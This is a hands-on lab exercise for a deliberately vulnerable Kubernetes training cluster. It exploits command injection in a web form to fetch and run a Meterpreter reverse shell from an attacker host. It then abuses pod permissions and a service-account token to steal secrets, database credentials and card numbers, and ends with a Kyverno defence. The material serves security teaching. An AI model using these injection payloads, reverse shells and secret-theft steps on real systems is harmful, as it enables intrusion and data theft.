---
layout: exercise
exercise: 85
title: "Exercise: Kubernetes Secrets Attack and Defense"
tools: openssh-client metasploit-framework curl python3 nmap
directories_to_sync: ssh-config unfinished
---


## Steps

1. Start up a fresh lxterminal by clicking the "sparrow" logo in the bottom-left corner of the screen, clicking run, typing `lxterminal` and hitting enter. Alternatively, use the hot key sequence below:

    ```
    <hold down Alt><hit F2>lxterminal<HIT the enter key>
    ```

2. SSH into the control plane node on the cluster:

    ```shell
    ssh -i /sync/bustakube-node-key root@bustakube-controlplane
    ```

3. Activate the Secrets scenario:

    ```shell
    /usr/share/bustakube/Scenario-Secret-Attack-and-Defense/stage.sh
    ```

4. Wait for this script to finish - it takes some time, even though we're pulling from a local container registry.

5. Now start a new tab by hitting `Ctrl-Shift-t`.

6. Run a TCP port scan of ports 31391 and 31392 on a cluster node, until you find both ports open.

    ```shell
    nmap -Pn -sT -p31391,31392 bustakube-node-1
    ```

7. Repeat the previous step until you find both ports 31391 and 31392 open.

8. Run a TCP port scan of the control-plane node's TCP ports that are reserved for node ports:

    ```shell
    nmap -Pn -sT -sV -p30000-32767 bustakube-controlplane
    ```

9. Review the output - we see there are two web servers running on ports 31391 and 31392.

10. Start up a Firefox browser.  You can use the icon in the top left menu bar, or use the same "Run" process from step 1.  Then browse to the first web application via this URL:

    <http://bustakube-controlplane:31391/>

11. Notice that you're seeing a web application that shows you flight seats purchased, with the names and ticket prices. They're all references from the movie "Airplane!"

12. Now check out the other web application. Browse to it via this URL:

    <http://bustakube-controlplane:31392/>

13. Notice that this form appears to be an URL connectivity checker from the same fictional airline. It has with a drop-down menu, so the user can only submit a few URLs for checking. Choose one the options, like this one:

    <http://bustakube-controlplane:31392/index.php?submit=submit&url=checkip.dyndns.org>

14. Try modifying that URL right in the URL bar, appending a semicolon `;` to the `url` parameter's value. If you like, you can click this link instead:

    <http://bustakube-controlplane:31392/index.php?submit=submit&url=checkip.dyndns.org%3Bid>

15. Notice that this form is clearly vulnerable to an injection attack and is adding our input to a shell command.  In using `id`, we've been told that the web server is running as user `www-data`.

16. We could keep running commands through the browser like this, but it would be more convenient to upload a more capable command and control (C2) agent like a Meterpreter. Go back to your terminal window and start a new tab by hitting `Ctrl-Shift-t`.

17. Create an ELF binary Meterpreter reverse shell with `msfvenom`, indicating that the Meterpreter should connect back to `10.23.58.30` on port `4444`.

    ```shell
    msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp \
      LHOST=10.23.58.30 LPORT=4444 -o mrsbin -f elf
    ```

18. Stage a simple web server on port `80` to serve this file:

    ```shell
    python3 -m http.server 80
    ```

19. Next you'll set up a Metasploit console that can receive an inbound connection from this Meterpreter. Start up a new terminal tab by hitting `Ctrl-Shift-t`.

20. Start up a Metasploit console:

    ```shell
    msfconsole
    ```

21. Set up a `multi/handler` to catch the shell.  Start by specifying `exploit/multi/handler`:

    ```shell
    use exploit/multi/handler
    ```

22. Set the handler to catch the corresponding payload to the one we specified in our `msfvenom` line:

    ```shell
    set payload linux/x86/meterpreter/reverse_tcp
    ```

23. Set the receiving host to `10.23.58.30`:

    ```shell
    set LHOST 10.23.58.30
    ```

24. Set `ExitOnSession` to `false`, so the handler can catch multiple incoming reverse shell connections:

    ```shell
    set ExitOnSession false
    ```

25. Now start the handler as a background job:

    ```shell
    exploit -j
    ```

26. Go back to your browser and change the `id` command in the URL bar into the following, so the target container will request the `mrsbin` binary from our web server, then hit the submit button:

    ```
    curl -o /tmp/mrsbin http://10.23.58.30/mrsbin
    ```

27. Now change the command in the URL bar to this one, so the target container will make the `mrsbin` binary executable and run it, and then hit the submit button:

    ```
    chmod 755 /tmp/mrsbin ; /tmp/mrsbin
    ```


28. Go check your Metasploit console. You should now see a line that reads something like "Meterpreter session 1 opened…"

29. Interact with this new session:

    ```shell
    sessions -i 1
    ```

30. Upload a copy of kubectl:

    ```shell
    upload /root/K8S-Exercise/kubectl
    ```

31. Instruct Meterpreter to give you a minimal interactive shell. You won't get any immediate feedback from the system, just a "Process … created" and "Channel … created" line from Metasploit.

    ```shell
    shell
    ```

32. Make the shell more interactive by starting a bash process with the `-i` flag:

    ```shell
    bash -i
    ```

33. Make the `kubectl` binary you just uploaded executable:

    ```shell
    chmod 755 kubectl
    ```

34. Set up a `kubectl` alias to use the existing cluster token:

    ```shell
    DIR='/var/run/secrets/kubernetes.io/serviceaccount/'
    alias kubectl="$(pwd)/kubectl --token=$(cat $DIR/token) \
    --certificate-authority=$DIR/ca.crt \
    --server=https://kubernetes.default.svc.cluster.local:443"
    ```

35. Check to see what privileges your user has in this pod:

    ```shell
    kubectl auth can-i --list
    ```

36. Notice that you are permitted to list and even create pods. Look for a line that starts with `pods` and ends with `[get list watch create]`.

37. List the pods in this namespace:

    ```shell
    kubectl get pods
    ```

38. It looks like the pod that showed us the ticket sales is called `view-seat-sales`. Use `kubectl describe` to get a human-friendly description of the pod:

    ```shell
    kubectl describe pod view-seat-sales
    ```

39. Notice that the `Environment` section says that this pod gets an environment variable called `PASSWORD` populated from the `password` key in the `transactions-secret` secret. It's similar for the `USER` environment variable.

40. Notice that the `Environment` section also says this pod gets an environment variable called `DBHOST` populated from the `dbhost` key in the `transactions-cm` configMap.

41. Look at the pod's manifest in YAML format to see how you can create pods that do this with their environment variables. Use the `grep` flag `-A` to see 10 lines **after** the matched line:

    ```shell
    kubectl get pod view-seat-sales -o yaml | grep -A 10 env:
    ```

42. Think about this - anyone who can start a pod in a namespace is able to have any secret in that namespace placed into their pod as an environment variable. We can use this to steal these database credentials.

43. Create a pod from the `bustakube/http-display-env-variables` image. This image runs a simple web server that displays any environment variables it has. You'll have this pod populate its `USER` and `PASSWORD` variables with the same secret that the `view-seat-sales` pod uses.

    ```shell
    cat <<END >pod-steal-secret.yaml
    apiVersion: v1
    kind: Pod
    metadata:
      labels:
        run: eve
      name: eve
    spec:
      containers:
      - image: bustakube/http-display-env-variables
        name: eve
        env:
        - name: USER
          valueFrom:
            secretKeyRef:
              name: transactions-secret
              key: user
        - name: PASSWORD
          valueFrom:
            secretKeyRef:
              name: transactions-secret
              key: password
        - name: DBHOST
          valueFrom:
            configMapKeyRef:
              name: transactions-cm
              key: dbhost
    END
    ```

44. Create this new pod:

    ```shell
    kubectl create -f pod-steal-secret.yaml
    ```

45. Now, let's get that pod's IP address. First, use `kubectl get pod` to see the pod's manifest and all its status:

    ```shell
    kubectl get pod eve -o yaml
    ```

46. Now, use `grep` to just get the `podIP` line:

    ```shell
    kubectl get pod eve -o yaml | grep podIP:
    ```

47. Now, parse that IP and place it in a variable called `ip`:

    ```shell
    ip=$(kubectl get pod eve -o yaml | grep podIP: | awk '{print $2}')
    ```

48. Run a `curl` command to connect to that pod and see the environment variables it received.

    ```shell
      curl -s http://$ip:8080
      ```

49. Let's grab just the `PASSWORD` line from that output:

    ```shell
    curl -s http://$ip:8080 | grep PASSWORD
    ```

50. Parse that password into a variable:

    ```shell
    PASSWORD=$(curl -s http://$ip:8080 | grep PASSWORD | awk '{print $3}')
    ```

51. Now do the same with the `USER` environment variable.

    ```shell
    USER=$(curl -s http://$ip:8080 | grep USER | awk '{print $3}')
    ```

52. Now try connecting to the PostgreSQL database using the username and password you gathered. First, set a variable to the server name:

    ```shell
    DB=$(curl -s http://$ip:8080 | grep DBHOST | awk '{print $3}')
    ```

53. Connect to the database:

    ```shell
    export PGPASSWORD=$PASSWORD
    psql --host $DB -U $USER -d app_db -p 5432
    ```


54. Now, view the databases:

    ```shell
    \list
    ```

55. Use the transactions database:

    ```shell
    \connect transactions
    ```

56. List the tables:

    ```shell
    \dt
    ```

57. Finally, read the contents of the `transactions` table:

    ```shell
    select * from transactions;
    ```

58. Notice that we now see all the transaction details, including credit card numbers!

59. Exit the PostgreSQL client:

    ```shell
    \q
    ```

60. Let's look at one other gotcha for secrets. This time, let's start a pod to steal a service account token in the same namespace. Take a look at what service account the other pod in the cluster, called `jenkins`, uses:

    ```shell
    kubectl get pod jenkins -o yaml | grep serviceAccount:
    ```

61. Now, let's see what that service account can do.  Create your own pod manifest, naming that service account as the one you'd like to use.

    ```shell
    cat <<END >pod-display-token.yaml
    apiVersion: v1
    kind: Pod
    metadata:
      name: display-token
    spec:
      containers:
      - image: bustakube/http-display-sa-token
        name: display-token
      dnsPolicy: ClusterFirst
      restartPolicy: Always
      serviceAccount: jenkins
    END
    ```

62. Now, stage the pod:

    ```shell
    kubectl create -f pod-display-token.yaml
    ```

63. Get the pod's IP address:

    ```shell
    ip=$( kubectl get pod display-token -o yaml \
     | grep podIP: |awk '{print $2}')
    ```

64. Now, connect to the pod with `curl` to receive the token:

    ```shell
    curl -s http://$ip:8080 >token
    ```

65. Display the token file:

    ```shell
    cat token
    ```

66. Now, let's see what that token can do!

    ```shell
    kubectl --token=$(cat token) auth can-i --list
    ```

67. Notice that the token is allowed to list secrets, but isn't allowed to retrieve any secrets.

68. Try listing secrets in this namespace.

    ```shell
    kubectl --token=$(cat token) get secrets
    ```

69. Now, time for the unintended side effect that has burned a number of defenders. Append a `-o yaml` to that last command to see the contents of every secret!

    ```shell
    kubectl --token=$(cat token) get secrets -o yaml
    ```

70. Notice that you can see the contents of all the secrets in this namespace. They're base64-encoded, but that's easy enough to deal with.

71. Let's examine one of the secrets in that dump. Take a look at the base64-encoded version of the transaction-secrets secret's password key.

    ```shell
    kubectl --token=$(cat token) get secrets -o yaml | \
      grep -B 10 'name: transactions-secret' | grep password
    ```

72. Grab the right hand side and base64 decode it:

    ```shell
    kubectl --token=$(cat token) get secrets -o yaml | \
      grep -B 10 'name: transactions-secret' | \
      grep password | awk '{print $2}' | base64 -d ; echo ""
    ```

73. Let's look at an admission controller called [Kyverno](https://kyverno.io/). Start another terminal tab by hitting `Ctrl-shift-t`.

74. Connect to the control plane node as the `bustakube` user using the password `bustakube`:

    ```shell
    ssh bustakube@bustakube-controlplane
    bustakube
    ```

75. Run sudo su - to elevate to `root`, using the password `bustakube`:

    ```shell
    sudo su -
    bustakube
    ```

76. Add the Kyverno Helm repository to Helm:

    ```shell
    helm repo add kyverno https://kyverno.github.io/kyverno/
    ```

77. Refresh the Helm repository:

    ```shell
    helm repo update
    ```

78. Install Kyverno into its own namespace:

    ```shell
    helm install kyverno kyverno/kyverno -n kyverno --create-namespace \
    --set replicaCount=1
    ```

79. Demonstrate to yourself that the `jenkins` service account is permitted to list secrets:

    ```shell
    kubectl --as=system:serviceaccount:default:jenkins get secrets
    ```

80. Pull down the `restrict-secret-role-verbs` Kyverno cluster policy manifest:

    ```shell
    
    url="https://github.com/kyverno/policies/raw/main/other"
    curl -LO ${url}/restrict-secret-role-verbs/restrict-secret-role-verbs.yaml
    ```

81. Kyverno cluster policies are in `audit` mode by default, where they alert on a violation of the policy, but do not block it. Modify this manifest to change the `validationFailureAction` to `enforce`.

    ```shell
    sed -i 's/audit/enforce/' restrict-secret-role-verbs.yaml
    ```

82. Delete the `list-secrets` role from the default namespace:

    ```shell
    kubectl delete role list-secrets
    ```

83. Activate the policy:

    ```shell
    kubectl create -f restrict-secret-role-verbs.yaml
    ```

84. Try to recreate the role:

    ```shell
    kubectl create role list-secrets --verb=list --resource=secrets
    ```

85. Notice that Kyverno has blocked the role's creation. Here's the output from the last command on our test system

    ```
    Error from server: admission webhook "validate.kyverno.svc-fail" denied the request:

    resource Role/default/list-secrets was blocked due to the following policies

    restrict-secret-role-verbs:
      secret-verbs: Requesting verbs `get`, `list`, or `watch` on Secrets is forbidden.
    ```

86. Now, delete the `restrict-secret-role-verbs` cluster policy:

    ```shell
    kubectl delete clusterpolicy.kyverno.io/restrict-secret-role-verbs
    ```

87. Attempt to create the `list-secrets` role again. You should find it possible again.

    ```shell
    kubectl create role list-secrets --verb=list --resource=secrets
    ```

88. List secrets using the recreated role:

    ```shell
    kubectl --as=system:serviceaccount:default:jenkins get secrets
    ```

89. Uninstall the Kyverno admission controller via Helm:

    ```shell
    helm -n kyverno uninstall kyverno
    ```
